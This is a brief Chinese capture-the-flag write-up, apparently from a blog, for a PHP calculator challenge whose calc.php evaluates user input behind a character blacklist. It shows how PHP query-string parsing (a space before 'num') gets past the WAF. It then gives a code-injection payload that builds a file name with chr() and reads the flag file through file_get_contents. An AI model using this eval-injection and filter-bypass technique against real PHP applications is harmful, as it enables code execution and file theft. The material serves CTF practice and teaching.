 https://blog.csdn.net/rfrder/article/details/109172067



calc.php

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>

```

利用PHP的[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)解析特性来绕过WAF，在num前面加上空格



chr

```
返回ascii对应的字符
```



file_get_contents

```

```





scandir

```
列出文件和目录
```



看到f1agg文件

```
? num=file_get_contents(chr(102).chr(49).chr(97).chr(103).chr(103))
```

得到flag
